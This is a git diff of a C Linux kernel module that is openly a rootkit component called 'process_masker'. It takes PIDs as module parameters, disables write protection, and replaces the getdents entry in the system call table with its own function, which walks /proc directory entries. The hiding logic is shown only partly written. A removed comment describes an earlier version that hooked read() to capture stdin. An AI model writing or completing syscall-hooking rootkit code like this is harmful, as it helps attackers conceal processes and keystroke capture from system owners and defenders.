@@ -17,37 +17,53 @@
 /*                                                                             */
 /*   Date: November 2015                                                       */
 /*                                                                             */
-/*   Usage: This kernel module hooks the read system call and outputs the      */
-/*          intercepted data when reading from stdin. Additionaly, when a      */
-/*          magic command gets intercepted it performs a panic-less system     */
-/*          reboot.                                                            */
+/*   Usage:                                                                    */
 /*                                                                             */
 /*******************************************************************************/
 
 #include <linux/module.h>   /* Needed by all modules */
 #include <linux/unistd.h>   /* Needed for __NR_getdents */
-#include <linux/syscalls.h>   /* Needed for struct linux_dirent */
+#include <linux/syscalls.h>   /* Needed for getdents system call */
+#include "process_masker.h"   /* Needed for struct linux_dirent */
 #include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */
 
 
 MODULE_LICENSE("GPL");
 
+static int pids[8] = { -1, -1, -1, -1, -1, -1, -1, -1 };
+static int pids_count = 0;
+module_param_array(pids, int, &pids_count, 0);
+
 
 void **sys_call_table;
-asmlinkage int (*getdents_syscall_ref)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
 
 /* Function that replaces the original getdents_syscall. In addition to what
    getdents_syscall does, it also  */
-asmlinkage int my_getdents_syscall_ref(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
-	int res;
+	int nread;
+	int nread_copy;
 
 	/* Call original getdents_syscall */
-	res = getdents_syscall_ref(fd, dirp, count);
+	nread = getdents_syscall(fd, dirp, count);
 
-	printk(KERN_INFO "Mouaxaxaxaxaxa!");
+	printk(KERN_INFO "Mouaxaxaxaxaxa! Inode: %8ld, Nread: %d", dirp->d_ino, nread);
 
-	return res;
+	if (dirp->d_ino == 1) {
+		printk(KERN_INFO "We are reading /proc dir!");
+		nread_copy = nread;
+
+		while (nread_copy > 0) {
+			nread_copy -= dirp->d_reclen;
+
+			//printk(KERN_INFO "Filename: %s\n", dirp->d_name);
+			dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
+		}
+	}
+
+	return nread;
 }
 
 
@@ -84,11 +100,11 @@ static int __init process_masker_start(void)
 
 	/* Store original getdents() syscall */
 	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
-	getdents_syscall_ref = (void *) sys_call_table[__NR_getdents];
+	getdents_syscall = (void *) sys_call_table[__NR_getdents];
 
 	/* Replace in the system call table the original
 	   getdents() syscall with our process masker function */
-	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall_ref;
+	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;
 
 	enable_write_protect_mode();
 
@@ -106,7 +122,7 @@ static void __exit process_masker_end(void)
 	disable_write_protect_mode();
 
 	/* Restore original getdents() syscall */
-	sys_call_table[__NR_getdents] = (int *) getdents_syscall_ref;
+	sys_call_table[__NR_getdents] = (int *) getdents_syscall;
 
 	enable_write_protect_mode();
 
